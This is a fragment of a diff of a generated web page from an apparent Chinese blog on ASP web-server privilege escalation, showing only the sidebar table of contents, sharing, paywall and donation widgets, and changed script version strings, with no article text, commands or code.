class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="toc-sidebar-link">iis6提权提示Can not find wmiprvse.exe的突破方法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#本地溢出提权" class="toc-sidebar-link">本地溢出提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sa提权" class="toc-sidebar-link">sa提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#root提权" class="toc-sidebar-link">root提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何查看root密码" class="toc-sidebar-link">如何查看root密码？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#serv-u提权" class="toc-sidebar-link">serv-u提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#端口转发" class="toc-sidebar-link">端口转发</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#星外提权" class="toc-sidebar-link">星外提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#ee提权法" class="toc-sidebar-link">ee提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#vbs提权法" class="toc-sidebar-link">vbs提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#_360提权" class="toc-sidebar-link">360提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#搜狗提权" class="toc-sidebar-link">搜狗提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#华众虚拟主机提权" class="toc-sidebar-link">华众虚拟主机提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box"><img src="/images/system/wechat.png" class="nozoom"> <span class="show-txt">手机看</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.9rem">微信扫一扫</span> <img height="180px" src="https://api.qrserver.com/v1/create-qr-code/?data=https://binghe001.github.io/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html" style="margin:10px;">
                 可以<b>手机看</b>或分享至<b>朋友圈</b></div></div></div></div> <div class="option-box"><img src="/images/system/toggle.png" width="30px" class="nozoom"> <span class="show-txt">左栏</span></div> <div class="option-box"><img src="/images/system/xingqiu.png" width="25px" class="nozoom"> <span class="show-txt">星球</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">实战项目<span style="font-size:8px;color:red;">「SpringCloud Alibaba实战项目」</span>、专属电子书、问题解答、简历指导、技术分享、晋升指导、视频课程</span> <img height="180px" src="/images/personal/xingqiu.png" style="margin:10px;"> <b>知识星球</b>：冰河技术
             </div></div></div></div> <div class="option-box"><img src="/images/system/wexin4.png" width="25px" class="nozoom"> <span class="show-txt">读者群</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">添加冰河微信<span style="color:red;">(hacker_binghe)</span>进冰河技术学习交流圈「无任何套路」</span> <img src="/images/personal/hacker_binghe.jpg" height="180px" style="margin:10px;">
                 PS：添加时请备注<b>读者加群</b>，谢谢！
@@ -445,7 +453,7 @@ HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>software<span class="t
               </div></div></div></div> <div class="option-box"><img src="/images/system/heart-1.png" width="25px" class="nozoom"> <span class="show-txt">赞赏我</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">鼓励/支持/赞赏我</span> <img height="180px" src="/images/personal/encourage-head.png" style="margin:5px;"> <br>1. 不靠它生存但仍希望得到你的鼓励；
                 <br>2. 时刻警醒自己保持技术人的初心；
               </div></div></div></div> <div title="NC反弹CMDSHELL提权总结" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html"><img src="/images/system/pre2.png" width="30px" class="nozoom"> <span class="show-txt">上一篇</span></a></div> <div title="MSF提权" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/raising/2022-05-02-004-MSF提权.html"><img src="/images/system/next2.png" width="30px" class="nozoom"> <span class="show-txt">下一篇</span></a></div></div>  <!----> </aside></div><div class="global-ui"><div class="read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="read-more-btn" target="_self" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">阅读全文</a> <div id="btw-modal-wrap" style="display: none;"><div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0);"></div> <div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;"><span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 34px; font-size: 34px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">×</span> <p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px;">
-                    扫码或搜索：<span style="color: #E9405A; font-weight: bold;">冰河技术</span> <br>发送：<span id="fustack-token" class="token" style="color: #e9415a; font-weight: bold; font-size: 17px; margin-bottom: 45px;">290992</span> <br>即可<span style="color: #e9415a; font-weight: bold;">立即永久</span>解锁本站全部文章</p> <img src="/images/personal/qrcode.png" style="width: 180px; margin-top: 10px; margin-bottom: 30px; border: 8px solid rgb(230, 230, 230);"></div></div></div><div class="pay-read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="pay-read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="pay-read-more-btn" target="_blank" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">付费阅读</a></div></div></div>
-    <script src="/assets/js/cg-styles.js?v=1656952104620" defer></script><script src="/assets/js/cg-3.js?v=1656952104620" defer></script><script src="/assets/js/cg-4.js?v=1656952104620" defer></script><script src="/assets/js/cg-177.js?v=1656952104620" defer></script><script src="/assets/js/cg-5.js?v=1656952104620" defer></script><script src="/assets/js/cg-6.js?v=1656952104620" defer></script><script src="/assets/js/cg-app.js?v=1656952104620" defer></script>
+                扫码或搜索：<span style="color: #E9405A; font-weight: bold;">冰河技术</span> <br>发送：<span id="fustack-token" class="token" style="color: #e9415a; font-weight: bold; font-size: 17px; margin-bottom: 45px;">290992</span> <br>即可<span style="color: #e9415a; font-weight: bold;">立即永久</span>解锁本站全部文章</p> <img src="/images/personal/qrcode.png" style="width: 180px; margin-top: 10px; margin-bottom: 30px; border: 8px solid rgb(230, 230, 230);"></div></div></div><div class="pay-read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="pay-read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="pay-read-more-btn" target="_blank" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">付费阅读</a></div></div></div>
+    <script src="/assets/js/cg-styles.js?v=1657521753750" defer></script><script src="/assets/js/cg-3.js?v=1657521753750" defer></script><script src="/assets/js/cg-4.js?v=1657521753750" defer></script><script src="/assets/js/cg-178.js?v=1657521753750" defer></script><script src="/assets/js/cg-5.js?v=1657521753750" defer></script><script src="/assets/js/cg-6.js?v=1657521753750" defer></script><script src="/assets/js/cg-app.js?v=1657521753750" defer></script>
   </body>
 </html>
